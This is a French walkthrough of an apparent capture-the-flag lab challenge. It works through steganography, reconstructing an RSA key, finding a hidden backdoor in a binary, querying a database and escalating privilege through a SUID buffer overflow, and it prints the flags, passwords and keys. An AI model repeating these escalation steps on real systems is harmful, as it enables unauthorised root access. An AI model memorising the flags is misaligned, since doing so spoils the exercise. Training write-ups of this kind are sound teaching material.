Difficulté : HARD (800 points)

Flag final : ESGISCTF{3l1t3_h4ck3r_m4st3r_0f_4ll_d0m41ns_2025}

Connexion
ssh w4rn1ng@localhost -p 2224
Mot de passe : ESGISCTF{1nter@ct1ve_sh3ll_ch@ll3ng3}

LAYER 1 : Stéganographie
Étape 1.1 : Reconnaissance initiale
# Lire le message de bienvenue
cat ELITE_CHALLENGE.txt

# Explorer le répertoire stéganographie
cd /opt/challenge/steganography/
ls -la

Étape 1.2 : Décoder les données hexadécimales cachées
# Utiliser le script de décodage
./decode_hex.sh

# OU décoder manuellement
cat .hex_data | xxd -r -p


Sortie attendue :

Message caché : Le coffre de cryptographie contient une paire de clés RSA privée-publique. Cherchez les clés dans /opt/challenge/cryptography

LAYER 2 : Cryptographie - Reconstruction de la clé RSA
Étape 2.1 : Examiner le répertoire crypto
cd /opt/challenge/cryptography/
ls -la


Fichiers présents : key_alpha.pem, key_beta.pem, key_gamma.pem, key_delta.pem, key_epsilon.pem, encrypted_message.bin, reconstruct_key.py

Étape 2.2 : Reconstruire la clé privée RSA
python3 reconstruct_key.py

# Vérifier la clé reconstruite
openssl rsa -in reconstructed_private.pem -check

Étape 2.3 : Décrypter le message
openssl rsautl -decrypt -inkey reconstructed_private.pem -in encrypted_message.bin


Sortie attendue :

Analyse réseau requise : Un service caché écoute sur localhost. Scanner les processus inhabituels et examiner le binaire dans /opt/challenge/reverse_engineering/

LAYER 3 : Reverse Engineering
Étape 3.1 : Analyser le binaire
cd /opt/challenge/reverse_engineering/
file security_scanner
strings security_scanner | grep -i secret

Étape 3.2 : Trouver la fonctionnalité cachée
strings security_scanner | grep "show_secrets"

# Tester la commande secrète
./security_scanner show_secrets


Sortie attendue :

BACKDOOR ACTIVÉ
Indice Analyse Réseau :
- Un service Python fonctionne sur localhost:8888
- Utiliser 'netstat -tlnp' ou 'ss -tlnp' pour confirmer
- Connexion : nc localhost 8888
- Le service nécessite un mot de passe spécifique
- Indice mot de passe : consulter les fichiers de la base de données

LAYER 4 : Analyse Réseau
Étape 4.1 : Scanner le service caché
netstat -tlnp | grep 8888
# OU
ss -tlnp | grep 8888

Étape 4.2 : Se connecter au service caché
nc localhost 8888


Le service demandera un code d'accès. Il faut le trouver dans la base de données.

LAYER 5 : Forensique Base de Données
Étape 5.1 : Examiner la base
cd /opt/challenge/database/
sqlite3 vault_database.db

Étape 5.2 : Extraire le code d'accès
.tables
SELECT * FROM access_codes;
SELECT * FROM vault_info;
.quit


Code d'accès trouvé : admin_secure_2025

Étape 5.3 : Accéder au service caché
nc localhost 8888
# Entrer : admin_secure_2025


Réponse du service :

Accès ACCORDÉ
Informations sur le challenge final :
Le flag ultime est chiffré en AES-256-CBC
Clé : master_key_quantum_2025
Emplacement du flag chiffré : /root/.vault/final_flag.enc
Il faut un accès root pour le lire !
Indice : utiliser le binaire security_scanner pour escalade de privilèges

LAYER 6 : Escalade de Privilèges
Étape 6.1 : Exploiter le buffer overflow
cd /opt/challenge/reverse_engineering/

# Le binaire est SUID et contient un buffer overflow
# Créer un payload pour dépasser le buffer
python3 -c "print('A' * 100)" | ./security_scanner

# OU utiliser le backdoor secret pour un accès root direct
./security_scanner show_secrets

Étape 6.2 : Récupérer le flag final
# Avec l'accès root
cat /root/.vault/final_flag.enc

# Décrypter avec la clé trouvée dans la base de données
echo "master_key_quantum_2025" > /tmp/key
openssl enc -d -aes-256-cbc -k "master_key_quantum_2025" -base64 -in /root/.vault/final_flag.enc


Flag final : ESGISCTF{3l1t3_h4ck3r_m4st3r_0f_4ll_d0m41ns_2025}